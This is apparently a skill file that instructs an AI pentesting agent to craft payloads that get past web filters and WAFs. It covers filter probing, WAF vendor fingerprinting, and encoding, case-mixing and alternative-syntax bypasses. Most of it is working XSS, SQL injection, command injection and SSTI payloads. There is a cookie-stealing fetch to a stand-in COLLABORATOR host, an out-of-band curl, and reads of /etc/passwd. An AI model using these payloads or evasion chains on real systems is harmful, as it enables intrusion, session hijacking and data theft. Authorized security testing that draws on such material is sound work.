---
name: craft-payload
description: Adaptive payload crafting when standard attacks fail — probe filters, build bypass chains, test incrementally
---

# Craft Custom Payloads

Standard payloads from auto_probe and get_payloads didn't work. The target has filtering, WAF, or unusual input handling. Your job: understand WHAT is blocked, WHY, and craft a bypass.

## When to Use This Skill

- auto_probe returned 0 findings on parameters you believe are vulnerable
- fuzz_parameter shows all payloads blocked/filtered identically
- WAF detected (403 on injection attempts, generic error page)
- Reflected input is encoded/stripped in unexpected ways
- You need to bypass a specific filter or content security policy

## Phase 1: Reconnaissance the Filter

Before crafting bypasses, understand what you're fighting. Use 3-5 tool calls max.

### Step 1: Character-level probing

Send individual special characters and check which survive:

```python
fuzz_parameter(index, parameter=param, payloads=[
    # HTML/XML special chars
    "<", ">", "'", '"', "/", "\\",
    # SQL special chars
    "'", "--", ";", "/*", "*/",
    # Command special chars
    "|", "&", "`", "$", "(", ")",
    # Template special chars
    "{", "}", "{{", "}}", "${", "<%",
    # Encoding chars
    "%", "\\x", "\\u",
    # Null/whitespace
    "%00", "%0a", "%0d", "\t",
], grep_match=["<", ">", "'", '"', "{", "}", "|", "&", "$"])
```

**Read the results carefully.** Build a filter map:

| Character | Input | Output | Status |
|---|---|---|---|
| `<` | `<` | `&lt;` | HTML-encoded |
| `>` | `>` | `&gt;` | HTML-encoded |
| `'` | `'` | `'` | Allowed |
| `"` | `"` | `&quot;` | HTML-encoded |
| `{{` | `{{` | `` | Stripped |
| `${` | `${` | `${` | Allowed |

This map tells you EXACTLY what bypass strategy to use.

### Step 2: Keyword-level probing

```python
fuzz_parameter(index, parameter=param, payloads=[
    # HTML tags
    "script", "<script>", "<img", "<svg", "<iframe",
    # SQL keywords
    "SELECT", "UNION", "OR", "AND", "SLEEP", "WAITFOR",
    # OS commands
    "cat", "id", "whoami", "ping", "curl", "wget",
    # Functions
    "alert", "confirm", "prompt", "system", "exec",
    # Events
    "onerror", "onload", "onclick", "onmouseover",
])
```

**What to look for:**
- Same response for all = no keyword filter (issue is elsewhere)
- Some blocked, some not = keyword blacklist (bypass with case mixing, encoding, concatenation)
- All blocked differently = WAF (check for WAF signature in 403 response)

### Step 3: Identify WAF vendor (if applicable)

```python
# Send known WAF trigger and read the error page
session_request(session, "GET", f"{path}?{param}=<script>alert(1)</script>")
# Check response for WAF signatures:
# "cloudflare" -> Cloudflare WAF
# "akamai" -> Akamai
# "mod_security" / "ModSecurity" -> ModSecurity
# "AWS WAF" / "Forbidden" with specific headers -> AWS WAF
# "imperva" / "incapsula" -> Imperva
# "f5" / "ASM" -> F5 BIG-IP
```

## Phase 2: Select Bypass Strategy

Based on the filter map, choose the right approach:

### Strategy A: Encoding Bypass (filter checks raw input, backend decodes)

**Preferred: Use `transform_chain` for multi-layer encoding in ONE call:**
```python
# Multi-layer bypass in one call (instead of 3 separate decode_encode calls)
transform_chain("<script>alert(1)</script>", ["url_encode", "base64_encode", "url_encode"])

# Detect what encoding is applied to a response value
detect_encoding("mystery_encoded_string")

# Auto-peel all encoding layers
smart_decode("nested_encoded_value")
```

**Single encoding operations:**
```python
# URL encoding
decode_encode("<script>alert(1)</script>", "url_encode")

# Double URL encoding (for backends that decode twice)
decode_encode("<script>alert(1)</script>", "double_url_encode")

# HTML entity encoding
decode_encode("<script>alert(1)</script>", "html_encode")

# Unicode encoding
decode_encode("<script>", "unicode_escape")
```

**Test each encoding against the filter:**
```python
fuzz_parameter(index, parameter=param, payloads=[
    "%3Cscript%3Ealert(1)%3C/script%3E",           # URL encoded
    "%253Cscript%253Ealert(1)%253C/script%253E",     # Double URL encoded
    "&#60;script&#62;alert(1)&#60;/script&#62;",     # HTML entities (decimal)
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", # HTML entities (hex)
])
```

### Strategy B: Case and Concatenation Bypass (keyword blacklist)

```python
# Case mixing
payloads = [
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    "sElEcT * fRoM users",
]

# Comment-padded SQL keywords
payloads = [
    "1' UN/**/ION SEL/**/ECT NULL--",
    "1'/**/UNION/**/SELECT/**/NULL--",
    "/*!50000UNION*//*!50000SELECT*/NULL",  # MySQL version comments
]

# String concatenation for JS execution
payloads = [
    "window['al'+'ert'](1)",                # Bracket notation + concat
    "atob('YWxlcnQoMSk=')",                # Base64 decode
    "Function('ale'+'rt(1)')()",            # Function constructor
    "setTimeout('ale'+'rt(1)',0)",          # setTimeout string argument
]

# OS command concatenation
payloads = [
    "w'h'o'am'i",                           # Quote-broken command name
    "c${z}at /etc/passwd",                  # Null variable insertion
    "/???/id",                               # Glob expansion
    "$IFS$9id",                              # IFS as space replacement
]
```

### Strategy C: Alternative Syntax Bypass (specific tag/function blocked)

```python
# If <script> is blocked, use event handlers:
get_payloads(category="xss", context="waf_bypass")

# If alert() is blocked:
payloads = [
    "<img src=x onerror=confirm(1)>",         # confirm instead
    "<img src=x onerror=prompt(1)>",          # prompt instead
    "<svg onload=alert`1`>",                   # Template literal call
    "<details open ontoggle=alert(1)>",        # Less common event
    "<body onpageshow=alert(1)>",              # Body event
    "<marquee onstart=alert(1)>x</marquee>",  # Legacy element
]

# If img/script/svg blocked:
payloads = [
    "<video><source onerror=alert(1)>",        # video element
    "<math><mi//xlink:href='javascript:alert(1)'>", # MathML
    "<input autofocus onfocus=alert(1)>",      # input autofocus
    "<select autofocus onfocus=alert(1)>",     # select autofocus
]

# If UNION/SELECT blocked (SQL):
payloads = [
    "1' AND SLEEP(3)--",                       # Time-based (no keywords needed)
    "1' AND ExtractValue(1,CONCAT(0x7e,version()))--", # Error-based
    "1' AND IF(1=1,SLEEP(3),0)--",             # Conditional timing
]

# If common commands blocked (OS):
payloads = [
    "; {cat,/etc/passwd}",                     # Brace expansion
    "| rev<<<'di'",                            # Reverse string trick
    "$'\\x69\\x64'",                           # Hex ANSI-C quoting
]
```

### Strategy D: Context-Specific Crafting

**For XSS in attribute context:**
```python
# Determine the quote type (single vs double)
# If inside value="...":
payloads = ['" onmouseover=alert(1) x="', '" autofocus onfocus=alert(1) x="']
# If inside value='...':
payloads = ["' onmouseover=alert(1) x='", "' autofocus onfocus=alert(1) x='"]
# If no quotes:
payloads = [" onmouseover=alert(1)", " autofocus onfocus=alert(1)"]
```

**For XSS in JavaScript context:**
```python
# If inside var x = "INPUT":
payloads = ['"-alert(1)-"', '";alert(1)//', '</script><script>alert(1)</script>']
# If inside var x = 'INPUT':
payloads = ["'-alert(1)-'", "';alert(1)//", "</script><script>alert(1)</script>"]
# If inside template literal `INPUT`:
payloads = ["`${alert(1)}`", "${alert(1)}"]
```

**For SQLi with specific DB:**
```python
get_payloads(category="sqli", context="mysql")       # MySQL-specific
get_payloads(category="sqli", context="postgresql")   # PostgreSQL-specific
get_payloads(category="sqli", context="mssql")        # MSSQL-specific
```

**For SSTI with specific engine:**
```python
# Identify engine first
probe_endpoint(session, method, path, param,
               test_payloads=["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"])
# If {{7*7}}=49: Jinja2/Twig/Handlebars
# If ${7*7}=49: FreeMarker/Mako/EL
# If <%=7*7%>=49: ERB

# Then get engine-specific RCE payloads
get_payloads(category="ssti", context="jinja2")
```

## Phase 3: Incremental Testing

Don't throw complex payloads blindly. Build up incrementally:

### XSS incremental approach
```
Step 1: Can I inject HTML?         -> <b>test</b>
Step 2: Can I inject attributes?   -> <b id=test>
Step 3: Can I inject events?       -> <b onmouseover=1>
Step 4: Can I call functions?      -> <b onmouseover=alert(1)>
Step 5: Can I execute JS?          -> <img src=x onerror=alert(document.domain)>
```

### SQLi incremental approach
```
Step 1: Does quote break syntax?   -> '
Step 2: Can I close the query?     -> ' OR '1'='1
Step 3: Can I add logic?           -> ' AND 1=1-- vs ' AND 1=2--
Step 4: Can I extract data?        -> ' UNION SELECT NULL--
Step 5: What data can I get?       -> ' UNION SELECT version()--
```

### CMDi incremental approach
```
Step 1: Does separator work?       -> ; (or | or & or ` or $())
Step 2: Can I run a command?       -> ; id
Step 3: Can I get output?          -> ; echo UNIQUE_MARKER
Step 4: If blind, timing?          -> ; sleep 5
Step 5: If blind, OOB?             -> ; curl http://COLLABORATOR
```

### Use fuzz_parameter for each step:
```python
fuzz_parameter(index, parameter=param,
    payloads=["<b>test</b>", "<b id=x>", "<b onmouseover=1>"],
    grep_match=["<b>test</b>", "<b id=x>", "<b onmouseover"])
```

## Phase 4: Payload Transformation Pipeline

When you find a working primitive, transform it for maximum impact:

```python
# 1. Start with working primitive
working = "<img src=x onerror=alert(1)>"

# 2. Replace alert with impact demonstration
impact = "<img src=x onerror=fetch('https://COLLABORATOR/steal?c='+document.cookie)>"

# 3. If encoding needed, transform
encoded = decode_encode(impact, "url_encode")

# 4. If double-encoding needed
double_encoded = decode_encode(impact, "double_url_encode")

# 5. Test the transformed payload
session_request(session, "GET", f"{path}?{param}={encoded}")
```

## Phase 5: Save the Bypass

Document what works for future sessions:

```python
save_target_notes(domain, """
## Filter Bypass Notes

### XSS Filter on /search?q
- HTML tags: <script> BLOCKED, <img> ALLOWED, <svg> ALLOWED
- Events: onerror ALLOWED, onload BLOCKED, ontoggle ALLOWED
- Functions: alert BLOCKED, confirm ALLOWED
- Working payload: <img src=x onerror=confirm(1)>
- Working encoded: %3Cimg%20src%3Dx%20onerror%3Dconfirm(1)%3E

### SQLi Filter on /api/users?id
- Keywords: UNION BLOCKED, SELECT BLOCKED, SLEEP ALLOWED
- Comments: /**/ ALLOWED, -- ALLOWED
- Bypass: 1' AND SLEEP(3)-- (time-based blind works)
- Bypass: 1'/**/UNION/**/SELECT/**/NULL-- (comment-padded keywords)

### WAF: Cloudflare (detected via cf-ray header)
- Blocks: <script>, UNION SELECT, alert(
- Allows: <svg>, template literals
""")
```

## Quick Reference: Bypass Techniques by Filter Type

| Filter | Bypass | Example |
|---|---|---|
| `<script>` blocked | Alternative tags | `<img>`, `<svg>`, `<details>`, `<body>` |
| `alert` blocked | Alternative functions | `confirm`, `prompt`, base64 decode chain |
| Quotes blocked | Backticks or no-quote | Template literals, event handlers without quotes |
| Spaces blocked | Tab, newline, slash | `<svg/onload=alert(1)>`, `{cat,/etc/passwd}` |
| `../` stripped | Double encoding | `..%252f`, `....//`, `..%c0%af` |
| UNION/SELECT blocked | Comment padding | `UN/**/ION SEL/**/ECT`, `/*!UNION*/` |
| Semicolon blocked | AND/pipe operators | `&& id`, `\|\| id`, newline `%0a` |
| WAF blocks all | Encoding chain | Double URL + case mix + comment pad |
| HTML-encodes output | Attribute breakout | `" autofocus onfocus=alert(1) x="` |
| Input length limited | Short payloads | `<svg/onload=alert(1)//`, `';alert(1)//` |
